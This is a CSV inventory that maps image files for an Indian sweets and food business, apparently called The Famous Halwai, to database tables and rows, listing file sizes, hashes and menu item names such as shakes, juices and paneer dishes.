153.jpg,notforgittrack/the-famous-halwai-images/images/153.jpg,84853,96b8c1215b0693fbc2fefc6cb67bc63facea4037e268617af84cca476b29d4da,932b50de261ea98415234af7dd0a9d7e,DB Mapped (Verified),menu_item_tbl,153,Black Current,menu_small_img
154.jpg,notforgittrack/the-famous-halwai-images/images/154.jpg,25820,a0260ca4ef8f1834d5451ecd24d582010f8815f2f4c9a57a561a19fa3cc21ad0,97bab0717936767039cd4be6ea8ee8ee,DB Mapped (Verified),menu_item_tbl,154,Khajoor Shake,menu_img
154.jpg,notforgittrack/the-famous-halwai-images/images/154.jpg,25820,a0260ca4ef8f1834d5451ecd24d582010f8815f2f4c9a57a561a19fa3cc21ad0,97bab0717936767039cd4be6ea8ee8ee,DB Mapped (Verified),menu_item_tbl,154,Khajoor Shake,menu_small_img
155.jpg,notforgittrack/the-famous-halwai-images/images/155.jpg,10457,8a01839ef38801602e5c3147e6d6a53ed4dff1622793490f900e4256c4bf1527,34aa3a5e6f2a4d20bf7700740439fe22,DB Mapped (Verified),menu_item_tbl,155,Cold Coffee,menu_img
155.jpg,notforgittrack/the-famous-halwai-images/images/155.jpg,10457,8a01839ef38801602e5c3147e6d6a53ed4dff1622793490f900e4256c4bf1527,34aa3a5e6f2a4d20bf7700740439fe22,DB Mapped (Verified),menu_item_tbl,155,Cold Coffee,menu_small_img
156.jpg,notforgittrack/the-famous-halwai-images/images/156.jpg,64446,f4024ba432f6c379daf8f5342999cb99e9a6677e66e2c14e61e1665a861c811d,6b1ee7229ee82d7f5bb79e3cb75dedbe,DB Mapped (Verified),menu_item_tbl,156,Badam Shake,menu_img
156.jpg,notforgittrack/the-famous-halwai-images/images/156.jpg,64446,f4024ba432f6c379daf8f5342999cb99e9a6677e66e2c14e61e1665a861c811d,6b1ee7229ee82d7f5bb79e3cb75dedbe,DB Mapped (Verified),menu_item_tbl,156,Badam Shake,menu_small_img
157.jpeg,notforgittrack/the-famous-halwai-images/images/157.jpeg,9604,2d9679d16d4ddfbf05937a42c53c88f639cf28f92ed2c3b4e61550c15322ab81,fbfa079190fad1cb0db44390a20668cb,DB Mapped (Verified),menu_item_tbl,157,Kesaria Thandai,menu_img
157.jpeg,notforgittrack/the-famous-halwai-images/images/157.jpeg,9604,2d9679d16d4ddfbf05937a42c53c88f639cf28f92ed2c3b4e61550c15322ab81,fbfa079190fad1cb0db44390a20668cb,DB Mapped (Verified),menu_item_tbl,157,Kesaria Thandai,menu_small_img
158.jpg,notforgittrack/the-famous-halwai-images/images/158.jpg,16170,00737a80de90a55288db3f8b8a8f544601928d21d6c233d43e89773558e1cc50,674944548f7ef767198ac330c647411a,DB Mapped (Verified),menu_item_tbl,158,Pista Shake,menu_img
158.jpg,notforgittrack/the-famous-halwai-images/images/158.jpg,16170,00737a80de90a55288db3f8b8a8f544601928d21d6c233d43e89773558e1cc50,674944548f7ef767198ac330c647411a,DB Mapped (Verified),menu_item_tbl,158,Pista Shake,menu_small_img
159.jpg,notforgittrack/the-famous-halwai-images/images/159.jpg,13142,70691390ad6d49a0470214e10a31f483a397de9e9966b9089db00b124ae7bf0b,1f170965b164e422a024829758d27763,DB Mapped (Verified),menu_item_tbl,159,Khus Shake,menu_img
159.jpg,notforgittrack/the-famous-halwai-images/images/159.jpg,13142,70691390ad6d49a0470214e10a31f483a397de9e9966b9089db00b124ae7bf0b,1f170965b164e422a024829758d27763,DB Mapped (Verified),menu_item_tbl,159,Khus Shake,menu_small_img
16.webp,notforgittrack/the-famous-halwai-images/images/16.webp,63704,befd6065aad292e0dc2fc74abfea6495e4fd8320360b4b6b6cb97a5f27e0e417,21f03c992b42791daad53abecb115f3e,DB Mapped (Verified),menu_item_tbl,16,Kadhai Paneer,menu_img
160.jpg,notforgittrack/the-famous-halwai-images/images/160.jpg,11209,ef6067e1822c933097f98c6d06f3684c153f75e287a1912e381e240059d3fb2a,9c791c7e94e1f154127e64c6222a3bf5,DB Mapped (Verified),menu_item_tbl,160,Mango Lassi,menu_img
160.jpg,notforgittrack/the-famous-halwai-images/images/160.jpg,11209,ef6067e1822c933097f98c6d06f3684c153f75e287a1912e381e240059d3fb2a,9c791c7e94e1f154127e64c6222a3bf5,DB Mapped (Verified),menu_item_tbl,160,Mango Lassi,menu_small_img
161.jpg,notforgittrack/the-famous-halwai-images/images/161.jpg,5285,527e30de88af2e13de1cd6737d93fb66a224495e11d03e620f766875a8889185,f7bcde7a2ee24c464f4b0e51970d8d16,DB Mapped (Verified),menu_item_tbl,161,Cheecoo Shake,menu_img
161.jpg,notforgittrack/the-famous-halwai-images/images/161.jpg,5285,527e30de88af2e13de1cd6737d93fb66a224495e11d03e620f766875a8889185,f7bcde7a2ee24c464f4b0e51970d8d16,DB Mapped (Verified),menu_item_tbl,161,Cheecoo Shake,menu_small_img
162.jpeg,notforgittrack/the-famous-halwai-images/images/162.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,162,Mango Shake,menu_img
162.jpeg,notforgittrack/the-famous-halwai-images/images/162.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,162,Mango Shake,menu_small_img
163.jpg,notforgittrack/the-famous-halwai-images/images/163.jpg,10685,b6c220ceebe439993aef857f4fc6bd92f4015c862a761004c412845aa5bf9fac,cb3d5b5ed0255c0d7c98703c6e9d0c63,DB Mapped (Verified),menu_item_tbl,163,Choco Shake,menu_img
163.jpg,notforgittrack/the-famous-halwai-images/images/163.jpg,10685,b6c220ceebe439993aef857f4fc6bd92f4015c862a761004c412845aa5bf9fac,cb3d5b5ed0255c0d7c98703c6e9d0c63,DB Mapped (Verified),menu_item_tbl,163,Choco Shake,menu_small_img
164.webp,notforgittrack/the-famous-halwai-images/images/164.webp,29166,a5ab683e866f385c0c4c979b4e5104aa28a87fa1f996cab5d09af80fc2b025b5,343cc40c083fc3c6d6b240f3ef25ae06,DB Mapped (Verified),menu_item_tbl,164,Banana Shake,menu_img
164.webp,notforgittrack/the-famous-halwai-images/images/164.webp,29166,a5ab683e866f385c0c4c979b4e5104aa28a87fa1f996cab5d09af80fc2b025b5,343cc40c083fc3c6d6b240f3ef25ae06,DB Mapped (Verified),menu_item_tbl,164,Banana Shake,menu_small_img
165.jpeg,notforgittrack/the-famous-halwai-images/images/165.jpeg,5928,5c1b1ebbac9b1cdf55d3be22e0e6a3e631a4994b74453fae3dd77e7dd4df4bfd,6728b7d776f5d6c60cf39c387828af47,DB Mapped (Verified),menu_item_tbl,165,Fruit Shake,menu_img
165.jpeg,notforgittrack/the-famous-halwai-images/images/165.jpeg,5928,5c1b1ebbac9b1cdf55d3be22e0e6a3e631a4994b74453fae3dd77e7dd4df4bfd,6728b7d776f5d6c60cf39c387828af47,DB Mapped (Verified),menu_item_tbl,165,Fruit Shake,menu_small_img
166.webp,notforgittrack/the-famous-halwai-images/images/166.webp,55818,2b1cefef794be7245f441276f12ac062e230c6f270419e6624d02de5824615bd,4881bd299fc6e33d5ab033af573ba7c1,DB Mapped (Verified),menu_item_tbl,166,Thandai,menu_img
166.webp,notforgittrack/the-famous-halwai-images/images/166.webp,55818,2b1cefef794be7245f441276f12ac062e230c6f270419e6624d02de5824615bd,4881bd299fc6e33d5ab033af573ba7c1,DB Mapped (Verified),menu_item_tbl,166,Thandai,menu_small_img
167.jpg,notforgittrack/the-famous-halwai-images/images/167.jpg,62666,0e4c9b09c6f5ec3844012f30043f06a81dc4ac51e6a08d7291187ef308c4e2d5,3b3f25ab54be2e33e2cbf36bf4354dd7,DB Mapped (Verified),menu_item_tbl,167,Khajoor,menu_img
167.jpg,notforgittrack/the-famous-halwai-images/images/167.jpg,62666,0e4c9b09c6f5ec3844012f30043f06a81dc4ac51e6a08d7291187ef308c4e2d5,3b3f25ab54be2e33e2cbf36bf4354dd7,DB Mapped (Verified),menu_item_tbl,167,Khajoor,menu_small_img
168.jpg,notforgittrack/the-famous-halwai-images/images/168.jpg,11237,efd482e3feeb2e111a60f77f5b13f6d39358db481c7ad66b1497f31805a1f7e9,5dbd83b5410e150a004098ae0aa29fab,DB Mapped (Verified),menu_item_tbl,168,Lassi,menu_img
168.jpg,notforgittrack/the-famous-halwai-images/images/168.jpg,11237,efd482e3feeb2e111a60f77f5b13f6d39358db481c7ad66b1497f31805a1f7e9,5dbd83b5410e150a004098ae0aa29fab,DB Mapped (Verified),menu_item_tbl,168,Lassi,menu_small_img
169.jpeg,notforgittrack/the-famous-halwai-images/images/169.jpeg,8805,f290c7bfcaad3c1186c6abe55e5e205e7ea39dfe58c42d4f810aa05d64639f71,0ff37f25ca609a104c761c4068b6a6f4,DB Mapped (Verified),menu_item_tbl,169,Mix Fruits,menu_img
169.jpeg,notforgittrack/the-famous-halwai-images/images/169.jpeg,8805,f290c7bfcaad3c1186c6abe55e5e205e7ea39dfe58c42d4f810aa05d64639f71,0ff37f25ca609a104c761c4068b6a6f4,DB Mapped (Verified),menu_item_tbl,169,Mix Fruits,menu_small_img
17.jpeg,notforgittrack/the-famous-halwai-images/images/17.jpeg,13207,4a578f0e959543a2260f7b2984d1f3d50eba9d501ee61a25263af7c6f742c27e,78d3b652d265893ac5ef2bcf2cca167b,DB Mapped (Verified),menu_item_tbl,17,Mix Veg,menu_img
170.jpg,notforgittrack/the-famous-halwai-images/images/170.jpg,18463,78e27a9be89d69a86cd7edf7f60d32403b3b2cf26ff0d436fd3ef606e0a69c22,316eb7e3d8704b15bb1026e44c526f20,DB Mapped (Verified),menu_item_tbl,170,Fresh Juice,menu_img
170.jpg,notforgittrack/the-famous-halwai-images/images/170.jpg,18463,78e27a9be89d69a86cd7edf7f60d32403b3b2cf26ff0d436fd3ef606e0a69c22,316eb7e3d8704b15bb1026e44c526f20,DB Mapped (Verified),menu_item_tbl,170,Fresh Juice,menu_small_img
171.jpeg,notforgittrack/the-famous-halwai-images/images/171.jpeg,3840,80c7172e95060546790ea5d31ce87838a93c953926fb326bf792e0371b655c08,28b8f190bd0a1488fde0697f7029bf2e,DB Mapped (Verified),menu_item_tbl,171,Coconut Water,menu_img
171.jpeg,notforgittrack/the-famous-halwai-images/images/171.jpeg,3840,80c7172e95060546790ea5d31ce87838a93c953926fb326bf792e0371b655c08,28b8f190bd0a1488fde0697f7029bf2e,DB Mapped (Verified),menu_item_tbl,171,Coconut Water,menu_small_img
172.png,notforgittrack/the-famous-halwai-images/images/172.png,85435,a151035bff8ca925d797fa2efea9613abe8097eed5b794e14e963c0f2607e373,bdc96ed01ebc4a812226bbef4a315578,DB Mapped (Verified),menu_item_tbl,172,Guava Juice,menu_img
172.png,notforgittrack/the-famous-halwai-images/images/172.png,85435,a151035bff8ca925d797fa2efea9613abe8097eed5b794e14e963c0f2607e373,bdc96ed01ebc4a812226bbef4a315578,DB Mapped (Verified),menu_item_tbl,172,Guava Juice,menu_small_img
173.jpg,notforgittrack/the-famous-halwai-images/images/173.jpg,11462,63833af9faac7f633e8f7d3e411081c14754bb8324eb69f012ef173980246b73,8cea1fedf5283aba8e37c278adab3f07,DB Mapped (Verified),menu_item_tbl,173,Papita Juice,menu_img
173.jpg,notforgittrack/the-famous-halwai-images/images/173.jpg,11462,63833af9faac7f633e8f7d3e411081c14754bb8324eb69f012ef173980246b73,8cea1fedf5283aba8e37c278adab3f07,DB Mapped (Verified),menu_item_tbl,173,Papita Juice,menu_small_img
174.jpeg,notforgittrack/the-famous-halwai-images/images/174.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,174,Mango Juice,menu_img
174.jpeg,notforgittrack/the-famous-halwai-images/images/174.jpeg,12308,6c6eb96a71b68592e043936413e9f4aa02ad9dae681d0973a4d1acd0096536aa,88e5961e134cc19ce5edc95b57bc60c8,DB Mapped (Verified),menu_item_tbl,174,Mango Juice,menu_small_img
175.jpg,notforgittrack/the-famous-halwai-images/images/175.jpg,15666,570fea4cf18dc020d39f18a447c363e2cfbe93b3e1bbe86dbf4055de1dd5ef55,c9bc65073e2a142cb804a0a72ed69f7e,DB Mapped (Verified),menu_item_tbl,175,Plum Juice,menu_img
175.jpg,notforgittrack/the-famous-halwai-images/images/175.jpg,15666,570fea4cf18dc020d39f18a447c363e2cfbe93b3e1bbe86dbf4055de1dd5ef55,c9bc65073e2a142cb804a0a72ed69f7e,DB Mapped (Verified),menu_item_tbl,175,Plum Juice,menu_small_img
176.jpg,notforgittrack/the-famous-halwai-images/images/176.jpg,12005,a43b890fab3f401370245c33f4fc9a00e72fee4a58faea6c6c3ef1c7ad5cbb25,48cf8f92a3a7830ba345ad6618e19d2c,DB Mapped (Verified),menu_item_tbl,176,Water Melon Juice,menu_img
176.jpg,notforgittrack/the-famous-halwai-images/images/176.jpg,12005,a43b890fab3f401370245c33f4fc9a00e72fee4a58faea6c6c3ef1c7ad5cbb25,48cf8f92a3a7830ba345ad6618e19d2c,DB Mapped (Verified),menu_item_tbl,176,Water Melon Juice,menu_small_img
177.webp,notforgittrack/the-famous-halwai-images/images/177.webp,43226,734867f9bbffea8d4f94723c98be4148af6afed1c5667faa888627ae9ea5a54a,a86ab29839cc7ff75c724d47a799481e,DB Mapped (Verified),menu_item_tbl,177,Falsa Juice,menu_img
177.webp,notforgittrack/the-famous-halwai-images/images/177.webp,43226,734867f9bbffea8d4f94723c98be4148af6afed1c5667faa888627ae9ea5a54a,a86ab29839cc7ff75c724d47a799481e,DB Mapped (Verified),menu_item_tbl,177,Falsa Juice,menu_small_img
178.jpeg,notforgittrack/the-famous-halwai-images/images/178.jpeg,4959,da68eb8a35b1d6ee8581c89e58fd42caa794b0e86d0094b3dd9a6de41bf4817e,5ec828ff595ea8a2d1a0440cf57f87cb,DB Mapped (Verified),menu_item_tbl,178,Kiwi Juice,menu_img
178.jpeg,notforgittrack/the-famous-halwai-images/images/178.jpeg,4959,da68eb8a35b1d6ee8581c89e58fd42caa794b0e86d0094b3dd9a6de41bf4817e,5ec828ff595ea8a2d1a0440cf57f87cb,DB Mapped (Verified),menu_item_tbl,178,Kiwi Juice,menu_small_img
179.jpg,notforgittrack/the-famous-halwai-images/images/179.jpg,165712,97bf8a18199c46c7625ef6e8dfb30c9adbc99cc4fd3ea55eaf2e5299946b5e95,a10da67799f415aad9a31988cc7e46da,DB Mapped (Verified),menu_item_tbl,179,Tutti Frooti,menu_img
179.jpg,notforgittrack/the-famous-halwai-images/images/179.jpg,165712,97bf8a18199c46c7625ef6e8dfb30c9adbc99cc4fd3ea55eaf2e5299946b5e95,a10da67799f415aad9a31988cc7e46da,DB Mapped (Verified),menu_item_tbl,179,Tutti Frooti,menu_small_img
18.jpg,notforgittrack/the-famous-halwai-images/images/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,notforgittrack/the-famous-halwai-images/images/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,notforgittrack/the-famous-halwai-images/images/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,notforgittrack/the-famous-halwai-images/images/18.jpg,94574,58ae6bb5007db22629a983c6d554fbec12f036df0b5ebc4493f899087f3873b8,68ed08ef1cd71bd9ed802fe29904884a,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
180.jpeg,notforgittrack/the-famous-halwai-images/images/180.jpeg,4450,2cda43f8a6cdc6d6d2205bd4f173c2bdaa108b0bfc91b5d9965b2126780f9d72,adf0688d3450216b6b71f025ede6a92a,DB Mapped (Verified),menu_item_tbl,180,Ice Cream With Soda,menu_img
180.jpeg,notforgittrack/the-famous-halwai-images/images/180.jpeg,4450,2cda43f8a6cdc6d6d2205bd4f173c2bdaa108b0bfc91b5d9965b2126780f9d72,adf0688d3450216b6b71f025ede6a92a,DB Mapped (Verified),menu_item_tbl,180,Ice Cream With Soda,menu_small_img
181.jpg,notforgittrack/the-famous-halwai-images/images/181.jpg,9632,55eeb1ffd33c6957bf50b20edeb7c5812022a04d43bd3cf51875ccd69ba2a01f,9ec8e53f6134a6016fa56d85f567adaf,DB Mapped (Verified),menu_item_tbl,181,Rusburry,menu_img
181.jpg,notforgittrack/the-famous-halwai-images/images/181.jpg,9632,55eeb1ffd33c6957bf50b20edeb7c5812022a04d43bd3cf51875ccd69ba2a01f,9ec8e53f6134a6016fa56d85f567adaf,DB Mapped (Verified),menu_item_tbl,181,Rusburry,menu_small_img
182.jpeg,notforgittrack/the-famous-halwai-images/images/182.jpeg,8525,7fb7641ee1189b611fa3dde92e12876dbd7af701a1e07b236c2088ba8240d1de,bc675648460d4f015d71dde626f8cf13,DB Mapped (Verified),menu_item_tbl,182,Khumani,menu_img
182.jpeg,notforgittrack/the-famous-halwai-images/images/182.jpeg,8525,7fb7641ee1189b611fa3dde92e12876dbd7af701a1e07b236c2088ba8240d1de,bc675648460d4f015d71dde626f8cf13,DB Mapped (Verified),menu_item_tbl,182,Khumani,menu_small_img
183.jpeg,notforgittrack/the-famous-halwai-images/images/183.jpeg,8520,0b5bcdc60fddaf314196edc138df3214a5431d7147fad3f6ab69985c8aa25f08,f0fabfcc95da432dea587ae79e3a04a9,DB Mapped (Verified),menu_item_tbl,183,Grapes Juice,menu_img
183.jpeg,notforgittrack/the-famous-halwai-images/images/183.jpeg,8520,0b5bcdc60fddaf314196edc138df3214a5431d7147fad3f6ab69985c8aa25f08,f0fabfcc95da432dea587ae79e3a04a9,DB Mapped (Verified),menu_item_tbl,183,Grapes Juice,menu_small_img
184.jpg,notforgittrack/the-famous-halwai-images/images/184.jpg,75417,35d552deb3ea6b8848111d7c5a50168eeeb3c19de0aa986067a956281e4d55e3,61ad346164406e2b372a885a7a06feaf,DB Mapped (Verified),menu_item_tbl,184,Full Green Salad,menu_img
184.jpg,notforgittrack/the-famous-halwai-images/images/184.jpg,75417,35d552deb3ea6b8848111d7c5a50168eeeb3c19de0aa986067a956281e4d55e3,61ad346164406e2b372a885a7a06feaf,DB Mapped (Verified),menu_item_tbl,184,Full Green Salad,menu_small_img
185.jpg,notforgittrack/the-famous-halwai-images/images/185.jpg,179160,51ef716d660ab575ebd2e9725c2e5afa614687467adb8322a87b82769d8de8d3,127b545dc96c98efe6ccf094fd86ff2c,DB Mapped (Verified),menu_item_tbl,185,Masala Onion Ring,menu_img
185.jpg,notforgittrack/the-famous-halwai-images/images/185.jpg,179160,51ef716d660ab575ebd2e9725c2e5afa614687467adb8322a87b82769d8de8d3,127b545dc96c98efe6ccf094fd86ff2c,DB Mapped (Verified),menu_item_tbl,185,Masala Onion Ring,menu_small_img
186.jpg,notforgittrack/the-famous-halwai-images/images/186.jpg,163337,b3e0e16e6b1ad34a2fb884d624e9ec7ee00a41ab63e19487832e67b124723a99,6982ffc8a0a83eb2430820b311de0b1f,DB Mapped (Verified),menu_item_tbl,186,Mixed Achar,menu_img
186.jpg,notforgittrack/the-famous-halwai-images/images/186.jpg,163337,b3e0e16e6b1ad34a2fb884d624e9ec7ee00a41ab63e19487832e67b124723a99,6982ffc8a0a83eb2430820b311de0b1f,DB Mapped (Verified),menu_item_tbl,186,Mixed Achar,menu_small_img
187.jpeg,notforgittrack/the-famous-halwai-images/images/187.jpeg,59166,f04d80ca51c3083d2620436d9b72fcb8833e8f3e8c426b6c52f1a41b9b5c4a09,5b35c221c069e1a2bcc258c7359ba1be,DB Mapped (Verified),menu_item_tbl,187,Murabba,menu_img
187.jpeg,notforgittrack/the-famous-halwai-images/images/187.jpeg,59166,f04d80ca51c3083d2620436d9b72fcb8833e8f3e8c426b6c52f1a41b9b5c4a09,5b35c221c069e1a2bcc258c7359ba1be,DB Mapped (Verified),menu_item_tbl,187,Murabba,menu_small_img
188.jpg,notforgittrack/the-famous-halwai-images/images/188.jpg,46496,43c7dd3c46dc0aba3c4121f445b93258a3bd5ae03fb804f34911662e227735c4,ffa38abeb0d5b2992af98f383e4d486c,DB Mapped (Verified),menu_item_tbl,188,Fresh Indian Fruits,menu_img
188.jpg,notforgittrack/the-famous-halwai-images/images/188.jpg,46496,43c7dd3c46dc0aba3c4121f445b93258a3bd5ae03fb804f34911662e227735c4,ffa38abeb0d5b2992af98f383e4d486c,DB Mapped (Verified),menu_item_tbl,188,Fresh Indian Fruits,menu_small_img
189.jpg,notforgittrack/the-famous-halwai-images/images/189.jpg,24706,73c93c424dff728e1699de376155d720ea031d26d53a0cc4583d9954d26f6846,74e6ae25b062f5b505c417ac1d6b45ab,DB Mapped (Verified),menu_item_tbl,189,Sirka Payaz,menu_img
189.jpg,notforgittrack/the-famous-halwai-images/images/189.jpg,24706,73c93c424dff728e1699de376155d720ea031d26d53a0cc4583d9954d26f6846,74e6ae25b062f5b505c417ac1d6b45ab,DB Mapped (Verified),menu_item_tbl,189,Sirka Payaz,menu_small_img
19.jpeg,notforgittrack/the-famous-halwai-images/images/19.jpeg,11233,3fc8d3e9ef519aae52c2883ecb1b0b56873cf7c2ddece261aca374a8ac6554a8,078f3b1748ffd3f185e0a3b479054255,DB Mapped (Verified),menu_item_tbl,19,Fruit Cream,menu_img
190.jpg,notforgittrack/the-famous-halwai-images/images/190.jpg,243340,1550f62c049b67364f6a2e72b3f130ca1c92e9f663dd1e39bbf5bed3b3a736e0,ae053f5023a5705b243eab3e7b094837,DB Mapped (Verified),menu_item_tbl,190,TFH Special Paneer,menu_img
191.webp,notforgittrack/the-famous-halwai-images/images/191.webp,63704,befd6065aad292e0dc2fc74abfea6495e4fd8320360b4b6b6cb97a5f27e0e417,21f03c992b42791daad53abecb115f3e,DB Mapped (Verified),menu_item_tbl,191,Kadai Paneer,menu_img
192.jpeg,notforgittrack/the-famous-halwai-images/images/192.jpeg,7704,d2fcb53ef483b5587a0601590b34cd43ec27f4c87cf1b17b66e9df415dbd45b9,c003f13f0aa3fd630b00c185d89a88a9,DB Mapped (Verified),menu_item_tbl,192,Khoya Paneer,menu_img
193.jpeg,notforgittrack/the-famous-halwai-images/images/193.jpeg,9934,a35c306421bfefc85fe11c7f3fd23f0984b9e08ab5a5c7239fb8768a7b05eee4,2d4a4b45e74abe5251494b18cf4036b0,DB Mapped (Verified),menu_item_tbl,193,Palak Paneer,menu_img
194.jpeg,notforgittrack/the-famous-halwai-images/images/194.jpeg,12166,5c3359ed62c8e57a455194c7528447670ac36a561a4dd2b82c7194349197f9ab,8b7e78b9912e368a882c9b3faed80dcd,DB Mapped (Verified),menu_item_tbl,194,Paneer Bhurji,menu_img
195.jpg,notforgittrack/the-famous-halwai-images/images/195.jpg,150025,f6a249185e3697cac46b6aa02d247360cf70bd238213c9a9d768efac8beefe84,1407ed67a0e9e4965d94b47711554c51,DB Mapped (Verified),menu_item_tbl,195,Stuffed Paneer,menu_img
196.jpg,notforgittrack/the-famous-halwai-images/images/196.jpg,199132,4e35879cae1258ccc88766be32d2191e97b64e8a84c4af93eea5d2c25ba7d6ef,2fae8d48ed32089ec61655ab56950a0b,DB Mapped (Verified),menu_item_tbl,196,Shai Paneer,menu_img
197.jpeg,notforgittrack/the-famous-halwai-images/images/197.jpeg,12427,61eb1232255eb3241e879a476df3d35ccf7521d12773d18466759254e0cb8c97,b184daeaaaecfd260494bacc329715d2,DB Mapped (Verified),menu_item_tbl,197,Paneer Butter Masala,menu_img
198.jpg,notforgittrack/the-famous-halwai-images/images/198.jpg,158393,51d126c81eaff573659d8cdfa4b3f6cf1ecdeccc7b870675ba89e9a2ca59c5a8,8777cbad0fdde2087ac722515f240031,DB Mapped (Verified),menu_item_tbl,198,Paneer Pasanda,menu_img
199.jpeg,notforgittrack/the-famous-halwai-images/images/199.jpeg,11166,65d25c1294c905e6a9495597b87c3e27e5c6ddf1c072295649ef430aadb16b2f,c4e95fa8aaca2cb39282c8bacdf90ebf,DB Mapped (Verified),menu_item_tbl,199,Matar Paneer,menu_img
2.jpg,notforgittrack/the-famous-halwai-images/images/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,notforgittrack/the-famous-halwai-images/images/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,notforgittrack/the-famous-halwai-images/images/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,notforgittrack/the-famous-halwai-images/images/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,notforgittrack/the-famous-halwai-images/images/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,notforgittrack/the-famous-halwai-images/images/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
20.jpeg,notforgittrack/the-famous-halwai-images/images/20.jpeg,9450,80f6ddb1e64d7228d6ac9e9474f0bb1a0f30ca2ded0a9a3c1031fd6399930c7e,856a09719958bc0b380c8241a6001df4,DB Mapped (Verified),menu_item_tbl,20,Shahi Tudka,menu_img
200.jpg,notforgittrack/the-famous-halwai-images/images/200.jpg,193970,50787f75bd29827a1459864964f10a18c96bd80254d492fef9f0d9e575eb50f9,50c2feff106d90ebe1b44af7b4c5812b,DB Mapped (Verified),menu_item_tbl,200,Alu Jeera,menu_img
201.jpeg,notforgittrack/the-famous-halwai-images/images/201.jpeg,14183,66db385f0093f830d76c3cac3e79fa64d521bbc9be29e24cc945fa0764c21a79,035bb30f09b8b0792584be108f1775d3,DB Mapped (Verified),menu_item_tbl,201,Mix Vegetables(Seasonal),menu_img
202.jpg,notforgittrack/the-famous-halwai-images/images/202.jpg,67143,2baae22107ec175b5cadcb676942415760d8e5cfef9b39e3b43d182259c9fc56,e031a1548bf2d787b132602088c62035,DB Mapped (Verified),menu_item_tbl,202,Vegetable Kofta,menu_img
203.jpg,notforgittrack/the-famous-halwai-images/images/203.jpg,64987,bdbe5627f3a96ec94b7189bd91d36210af02631faaec8b2c239cce85942762a0,b99005c94fd3ddc847a681518194e936,DB Mapped (Verified),menu_item_tbl,203,Khoya Matter,menu_img
204.jpeg,notforgittrack/the-famous-halwai-images/images/204.jpeg,10165,073f1f364c8755721868d22db9bdb17d2209a61dea4e0195724bfd038f0f0f5e,a068f2a0ef3a3344e467ca2cfc781c28,DB Mapped (Verified),menu_item_tbl,204,Matar Korma,menu_img
205.jpg,notforgittrack/the-famous-halwai-images/images/205.jpg,61202,08db026394ec532381fcf1265bc3f1feaa8ace4e269bbd324f2b69aa5616ee06,1f7a080211762f3b3ad899c4413c1ff9,DB Mapped (Verified),menu_item_tbl,205,Kashmiri Kofta,menu_img
206.jpg,notforgittrack/the-famous-halwai-images/images/206.jpg,46295,d5352bcaa158b0d71e022e36496d5d8a73e921bdb047bc4b8f1880d24e3adbc6,9bd12283dfa1795342dcd5aa1e0e822d,DB Mapped (Verified),menu_item_tbl,206,Allo Sikkampuri,menu_img
207.jpeg,notforgittrack/the-famous-halwai-images/images/207.jpeg,13207,4a578f0e959543a2260f7b2984d1f3d50eba9d501ee61a25263af7c6f742c27e,78d3b652d265893ac5ef2bcf2cca167b,DB Mapped (Verified),menu_item_tbl,207,Mixed Vegetable,menu_img
208.jpeg,notforgittrack/the-famous-halwai-images/images/208.jpeg,6199,3caaf1f661a63c93e5ff59874412a8607a8afbd3e0eef886577a9b431f45e40b,7efe9fc293b0650c3348c016d6bcd097,DB Mapped (Verified),menu_item_tbl,208,Dry Fruit Vegetable,menu_img
209.jpeg,notforgittrack/the-famous-halwai-images/images/209.jpeg,10711,95832e20c6c5941323fb90ee667c3d427a0c5bdcf98e13edf54ada57f4a9ef18,51b9da432f03b3df26e9956821d8d0b4,DB Mapped (Verified),menu_item_tbl,209,Sarso Ka Saag,menu_img
21.webp,notforgittrack/the-famous-halwai-images/images/21.webp,85368,1e7584fd5691f302bd797b0486cc48db050a3dcaad10d85eb3be8eb911a953a9,e812d6394b30711bb9cf2545784b5f71,DB Mapped (Verified),menu_item_tbl,21,Fruit Custard,menu_img
210.jpg,notforgittrack/the-famous-halwai-images/images/210.jpg,15169,1d9be344cf0431155786b801251f1ed68ef7d4fac2fcfd3d38915d0e1d870ef0,c986d89843f1e6c1c7dad77ce9226cab,DB Mapped (Verified),menu_item_tbl,210,Hara Chana,menu_img
